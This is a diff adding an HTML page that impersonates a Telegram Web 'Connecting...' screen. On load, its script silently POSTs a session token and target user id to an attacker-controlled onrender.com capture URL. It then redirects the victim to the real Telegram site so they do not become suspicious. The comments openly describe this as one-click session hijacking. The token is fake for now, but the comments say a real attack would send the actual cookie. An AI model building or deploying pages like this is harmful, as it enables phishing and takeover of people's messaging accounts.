@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web | Loading...</title>
+    <style>
+        /* Professional looking loading screen */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; background-color: #ffffff; 
+        }
+        .container { text-align: center; }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0088cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #222; font-size: 24px; margin-bottom: 10px; }
+        p { color: #777; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>Connecting...</h2>
+        <p>Please wait while we sync your session.</p>
+    </div>
+
+    <script>
+        // YOUR ATTACKER URL
+        const ATTACKER_URL = "https://my-session-interceptor.onrender.com/capture";
+
+        async function performHijack() {
+            // This simulates the stolen data. 
+            // In a real attack, this would be the actual session cookie.
+            const dataToSteal = {
+                session_token: "TOKEN_" + Math.random().toString(36).substring(7), // Random fake token
+                user_id: "Friend_Target_Account"
+            };
+
+            console.log("[*] Initiating background sync...");
+
+            try {
+                // The 'One-Click' theft happens here via a silent POST request
+                await fetch(ATTACKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dataToSteal),
+                    mode: 'cors' // Ensures the request can go to your Render URL
+                });
+
+                console.log("[+] Sync complete.");
+                
+                // Redirect them to the real Telegram Web so they don't get suspicious
+                window.location.href = "https://web.telegram.org";
+
+            } catch (error) {
+                console.error("[-] Sync error:", error);
+                // Even if it fails, redirect them so they don't see an error page
+                window.location.href = "https://web.telegram.org";
+            }
+        }
+
+        // Trigger the hijack immediately when the page loads
+        window.onload = performHijack;
+    </script>
+</body>
+</html>
